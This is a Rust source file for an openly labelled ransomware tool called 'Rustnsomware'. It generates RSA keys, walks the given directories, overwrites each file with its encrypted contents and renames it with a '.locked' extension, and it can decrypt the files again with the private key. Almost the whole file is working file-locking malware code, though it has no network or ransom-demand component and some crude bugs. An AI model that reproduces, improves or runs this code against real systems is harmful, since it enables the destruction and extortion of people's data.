use clap::Parser;
use filenamify::filenamify;
use rand;
use rsa::pkcs1::{
    DecodeRsaPrivateKey, DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey,
};
use rsa::pkcs8::LineEnding;
use rsa::{pkcs8::DecodePublicKey, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use std::borrow::Borrow;
use std::collections::LinkedList;
use std::fs::{self};
use std::io::{Read, Write};
use std::path::Path;
use std::{env, io};

/// > Rustnsomware: encrypt and decrypt filesystem
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(long)]
    private_key: Option<String>,

    #[arg(long)]
    public_key: Option<String>,

    #[arg(short, long, value_enum)]
    command: Option<RustnsomwareCommand>,

    #[arg(short, long)]
    verbose: bool,

    #[clap(value_parser, num_args = 1.., value_delimiter = ' ')]
    paths: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum RustnsomwareCommand {
    GenerateKeys,
    Encrypt,
    Decrypt,
}

fn get_file_as_byte_vec(filename: &String) -> Vec<u8> {
    dbg!(filename);
    let mut f = fs::OpenOptions::new()
        .create(true)
        .read(true)
        .write(true)
        .open(&filename)
        .unwrap();
    // let mut f = fs::File::open(&filename).expect("no file found");
    let metadata = fs::metadata(&filename).expect("unable to read metadata");
    let mut buffer = vec![0; metadata.len() as usize];
    f.read(&mut buffer).expect("buffer overflow");

    buffer
}

fn generate_keys() {
    println!("generating keys");
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);

    fs::create_dir_all("keys").expect("ERR");
    let mut key_name = Default::default();
    print!("Input key name: ");
    io::stdout().flush().expect("msg");
    io::stdin().read_line(&mut key_name).expect("ERR");
    let priv_key_filename = filenamify(key_name[..key_name.len() - 1].to_owned() + ".pem");

    priv_key
        .write_pkcs1_pem_file(
            String::from("keys/".to_owned() + &priv_key_filename),
            LineEnding::default(),
        )
        .expect("ERR");

    let pub_key_filename = filenamify(key_name[..key_name.len() - 1].to_owned() + ".pem.pub");
    pub_key
        .write_pkcs1_pem_file(
            String::from("keys/".to_owned() + &pub_key_filename),
            LineEnding::default(),
        )
        .expect("ERR");

    println!("keys generated");
}

fn traverse_file_tree(args: &Args, callback: &dyn Fn(&Path) -> ()) {
    let program_name = env::current_exe().expect("WTF??");

    let mut files: LinkedList<String> = LinkedList::new();
    args.paths.iter().for_each(|file| {
        files.push_back(String::from(file));
    });

    while !files.is_empty() {
        let current_file = files.pop_front().expect("This should not happen");
        let metadata = fs::metadata(current_file.clone()).unwrap();

        //TODO: skip if executable name is equal to current file
        /*
        if current_file == program_name.file_name().expect("WTF") {
            continue;
        }
        */

        if args.verbose {
            print!("Processing {}", current_file)
        }

        if metadata.is_dir() {
            fs::read_dir(current_file).unwrap().for_each(|f| {
                files.push_back(String::from(
                    f.unwrap().path().canonicalize().unwrap().to_string_lossy(),
                ));
            });
        } else if metadata.is_file() {
            callback(Path::new(&current_file))
        }
    }
}

fn encrypt_file(public_key: RsaPublicKey, path: &Path) {
    let mut rng = rand::thread_rng();
    let data = get_file_as_byte_vec(&path.to_str().unwrap().to_string());

    let enc_data = public_key
        .encrypt(&mut rng, Pkcs1v15Encrypt, &data)
        .expect("failed to encrypt")
        .to_vec();

    let mut file = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)
        .unwrap();

    file.write_all(&enc_data).expect("AA");

    fs::rename(path, String::from(path.to_str().unwrap()) + ".locked")
        .expect("Error while renaming file");
}

fn encrypt_files(args: &Args) {
    let pub_key =
        RsaPublicKey::read_pkcs1_pem_file(args.public_key.as_ref().expect("No public key path"))
            .unwrap();

    traverse_file_tree(args, &|path: &Path| encrypt_file(pub_key.to_owned(), &path));
}

fn decrypt_file(private_key: RsaPrivateKey, path: &Path) {
    let enc_data = get_file_as_byte_vec(&path.to_str().unwrap().to_string());

    let dec_data = private_key
        .decrypt(Pkcs1v15Encrypt, &enc_data)
        .expect("failed to decrypt");
    // let s = String::from_utf8(dec_data.clone()).expect("Our bytes should be valid utf8");

    let mut file = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)
        .unwrap();

    file.write_all(&dec_data).expect("AA");

    fs::rename(path, path.with_extension("")) // String::from(path.to_str().unwrap())
        .expect("Error while renaming file");
}

fn decrypt_files(args: &Args) {
    let priv_key =
        RsaPrivateKey::read_pkcs1_pem_file(args.private_key.as_ref().expect("No private key path"))
            .unwrap();

    traverse_file_tree(args, &|path: &Path| {
        decrypt_file(priv_key.to_owned(), &path)
    });
}

fn execute_command(command: RustnsomwareCommand, args: &Args) {
    match command {
        RustnsomwareCommand::GenerateKeys => generate_keys(),
        RustnsomwareCommand::Encrypt => encrypt_files(args),
        RustnsomwareCommand::Decrypt => decrypt_files(args),
    }
}

fn main() {
    let args = Args::parse();
    let command = &args.command;
    match command.to_owned() {
        None => {
            println!("No command provided, exiting");
            std::process::exit(1);
        }
        Some(command) => execute_command(command, &args),
    }

    std::process::exit(0);
}
